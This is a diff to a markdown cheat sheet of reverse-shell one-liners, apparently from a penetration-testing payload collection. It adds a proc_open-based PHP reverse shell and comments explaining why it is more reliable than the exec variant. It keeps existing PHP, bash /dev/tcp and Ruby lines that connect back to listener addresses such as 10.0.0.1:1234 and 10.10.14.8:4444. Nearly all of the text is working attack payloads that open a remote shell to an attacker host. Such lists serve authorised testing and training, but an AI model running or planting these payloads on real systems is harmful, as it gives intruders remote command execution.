@@ -130,8 +130,15 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 
 ## PHP
 
-```bash
+```php
+// Using 'exec' is the most common method, but makes the assumption that the file descriptor will be 3.
+// Using this method may lead to instances where the connection reaches out to the listener and then closes.
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+// Using 'proc_open' makes no assumptions about what the file descriptor will be.
+// See https://security.stackexchange.com/a/198944 for more information
+<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
+
 <?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
 ```
 
